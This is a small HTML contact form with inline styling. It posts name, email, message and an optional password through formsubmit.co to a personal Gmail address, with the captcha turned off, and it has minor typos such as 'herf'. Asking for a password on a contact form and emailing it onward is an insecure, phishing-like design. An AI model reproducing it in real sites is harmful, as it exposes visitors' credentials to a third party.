<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Contact Us</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #1db954;
    }
    .contact-form {
      background: #292626;;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(255, 255, 255, 0.973);
      width: 150%;
      max-width: 450px;
    }
    .contact-form h2 {
      margin-bottom: 20px;
    }
    .contact-form input,
    .contact-form textarea {
      width: 95%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
    .contact-form button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }
    .contact-form button:hover {
      background-color: #20cf1a;
    }
  </style>
</head>
<body>
  <form
    action="https://formsubmit.co/moviein64@gmail.com" 
    method="POST" 
    class="contact-form"
  >
    <h2>Contact Us</h2>
    <!-- Hidden input for form settings -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">

    <!-- Name -->
    <input type="text" name="name" placeholder="Your Name" required>

    <!-- Email -->
    <input type="email" name="email" placeholder="Your Email" required>

    <!-- Password -->
    <input type="password" name="password" placeholder="Your Password (Optional)">

    <!-- Message -->
    <textarea name="message" placeholder="Your Message" rows="5" required></textarea>

    <!-- Submit Button -->
    <button type="submit">Send</button>
    <a herf="signin.html">
      <p> Sign In</p>
    </a>
    
  </form>
</body>
</html>
